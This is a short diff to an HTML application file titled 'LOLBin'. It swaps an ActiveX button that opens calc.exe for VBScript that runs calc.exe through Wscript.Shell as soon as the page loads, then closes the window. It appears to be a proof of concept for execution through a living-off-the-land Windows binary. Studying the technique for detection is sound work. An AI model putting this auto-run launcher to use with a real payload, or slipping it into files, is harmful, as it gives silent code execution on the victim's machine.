@@ -1,5 +1,15 @@
 <html>
-
-<OBJECT classid=CLSID:8856F961-340A-11D0-A96B-00C04FD705A2 height=0 id=WebBrowser width=0></OBJECT> 
-<input name=Button onClick=document.all.WebBrowser.Navigate("c:/windows/system32/calc.exe") type=button value="open">
+<head>
+	<title>LOLBin</title>
+	<script language="VBScript">
+		Sub RunProgram
+            Set objShell = CreateObject("Wscript.Shell")
+            objShell.Run "c:\windows\system32\calc.exe"
+			Self.Close
+        End Sub
+	</script>
+</head>
+<body onload="RunProgram">
+    <h1>LOLBin</h1>
+</body>
 </html>
